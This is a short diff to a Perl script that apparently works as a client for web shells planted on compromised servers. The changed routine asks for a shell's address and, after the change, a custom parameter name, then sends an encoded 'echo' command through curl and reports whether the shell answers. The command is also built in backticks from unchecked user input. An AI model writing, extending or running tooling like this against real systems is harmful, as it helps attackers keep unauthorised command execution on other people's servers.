@@ -144,7 +144,9 @@ sub shell {
 # prompt for, get, and check for existence of a web shell at the user spcified address.
 print "Address of shell: ";
 chomp($loc = <STDIN>);
-$curl = "curl -s $loc?%73";
+print "Parameter name: ";
+chomp(my $param = <STDIN>);
+$curl = "curl -s $loc?" . $param;
 my $cmd = URLEncode("echo index.php");
 if (`$curl=$cmd` =~ m/index\.php/) {
     print "Shell found!\n";
